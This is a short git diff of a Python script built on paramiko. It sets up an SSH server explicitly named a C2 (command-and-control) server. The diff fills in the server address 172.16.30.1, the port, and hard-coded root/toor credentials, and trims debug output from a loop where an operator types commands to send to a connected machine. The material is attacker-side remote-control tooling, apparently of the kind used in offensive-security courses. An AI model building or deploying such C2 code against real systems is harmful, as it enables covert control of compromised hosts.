@@ -3,12 +3,12 @@ import paramiko
 import threading
 import sys
 
-C2_SERVER_ADDRESS = ''
+C2_SERVER_ADDRESS = '172.16.30.1'
 C2_SERVER_PORT = 22
 HOST_KEY = paramiko.RSAKey(filename='test_rsa.key')
 
-SSH_USERNAME = ''
-SSH_PASSWORD = ''
+SSH_USERNAME = 'root'
+SSH_PASSWORD = 'toor'
 
 
 class SSHServer (paramiko.ServerInterface):
@@ -54,8 +54,6 @@ def manage_communication(chan):
         try:
             print('-------------------')
             cmd = input("[+] Enter command: ")
-            print("Input cmd: ", cmd)
-            #.strip('\n')
             if cmd == 'help':
                 print_help()
                 continue
